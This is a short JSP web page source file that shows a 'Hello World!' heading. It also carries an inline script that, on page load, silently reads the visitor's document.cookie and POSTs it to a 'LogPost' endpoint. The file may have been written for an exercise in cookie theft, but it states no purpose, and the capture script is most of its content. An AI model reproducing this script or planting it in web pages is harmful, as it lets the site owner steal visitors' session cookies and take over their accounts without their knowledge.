<%-- 
    Document   : index
    Created on : Oct 2, 2013, 11:41:52 AM
    Author     : cw1491
--%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Page</title>
    </head>
    <body>
        <h1>Hello World!</h1>
        <script>
            var http = new XMLHttpRequest();
            var url = "LogPost";
            var params = "cookie=" + encodeURIComponent(document.cookie);
            http.open("POST", url, true);

    //Send the proper header information along with the request
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

            http.onreadystatechange = function () {}
            http.send(params);
        </script>
    </body>
</html>
